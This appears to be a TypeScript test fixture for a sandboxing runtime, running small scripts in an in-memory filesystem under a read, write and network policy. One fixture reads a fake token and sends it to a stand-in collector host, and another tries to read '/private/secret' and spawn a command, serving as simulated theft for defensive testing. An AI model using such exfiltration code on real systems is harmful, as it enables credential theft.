import { fileURLToPath } from 'node:url';
import { InMemoryFs } from 'just-bash';
import { runSyntheticSession } from './session.js';

// This fixture prelude is not a Node polyfill. Only synchronous broker operations
// are supported. It is intentionally supplied with the fixture, not user code.
export const FIXTURE_PRELUDE = `
const call = (operation, target, body) => {
  const response = JSON.parse(__hostCall(JSON.stringify({ operation, target, body })));
  if (!response.ok) throw new Error(response.error);
  return response.value;
};
const fs = {
  readFileSync: path => call('read', path),
  writeFileSync: (path, body) => call('write', path, body),
  appendFileSync: (path, body) => call('append', path, body),
  existsSync: path => call('exists', path),
  statSync: path => call('stat', path),
  readdirSync: path => call('readdir', path),
  mkdirSync: path => call('mkdir', path),
};`;

export const FIXTURES = {
  credential: `const token = fs.readFileSync('/workspace/input.txt'); call('network', 'https://collector.invalid/collect', token); fs.writeFileSync('/workspace/result.txt', 'fixture complete');`,
  transform: `fs.mkdirSync('/workspace/out'); fs.writeFileSync('/workspace/out/result.txt', fs.readFileSync('/workspace/input.txt').toUpperCase()); fs.appendFileSync('/workspace/out/result.txt', '!'); if (!fs.existsSync('/workspace/out/result.txt') || fs.statSync('/workspace/out/result.txt').size < 1 || fs.readdirSync('/workspace/out').length !== 1) throw new Error('invalid filesystem state');`,
  failure: `fs.readFileSync('/workspace/input.txt'); throw new Error('synthetic failure after read');`,
  denied: `try { fs.readFileSync('/private/secret'); } catch {} try { call('spawn', 'some-command'); } catch {}`,
} as const;

export async function runFixture(name: keyof typeof FIXTURES) {
  const fs = new InMemoryFs({ '/workspace/script.js': `${FIXTURE_PRELUDE}\n${FIXTURES[name]}` }, { maxTotalBytes: 1024 * 1024 });
  return runSyntheticSession({
    binary: fileURLToPath(new URL('../../runtime/target/debug/devprotect-runtime', import.meta.url)),
    fs,
    policy: { read: ['/workspace', '/usr/bin', '/bin'], write: ['/workspace'], network: { 'https://collector.invalid/collect': { status: 204, body: '' } } },
    cwd: '/workspace',
    shell: "printf 'DEVPROTECT_FAKE_TOKEN' > /workspace/input.txt && node script.js" + (name === 'credential' ? ' && cat result.txt' : ''),
  });
}

export async function runDemo() {
  const result = await runFixture('credential');
  return { ...result, mode: 'synthetic-fixture-only',
    credentialObservedInRequest: result.events.some(event => event.operation === 'network-attempt' && event.body === 'DEVPROTECT_FAKE_TOKEN'),
    shellObservedJavaScriptWrite: result.stdout === 'fixture complete',
  };
}
